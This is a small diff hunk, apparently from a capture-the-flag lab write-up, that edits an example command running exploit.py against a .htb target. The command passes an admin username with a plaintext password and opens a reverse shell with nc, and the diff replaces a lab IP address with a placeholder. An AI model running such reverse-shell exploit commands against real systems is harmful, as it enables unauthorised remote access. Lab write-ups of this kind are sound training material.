@@ -541,7 +541,7 @@ python3 exploit.py \
   -t http://support_001.enigma.htb \
   -u admin \
   -p 'Ne3s4rtars78s' \
-  --reverse-shell 10.10.15.241 4444 \
+  --reverse-shell IP 4444 \
   --method nc
 ```
 
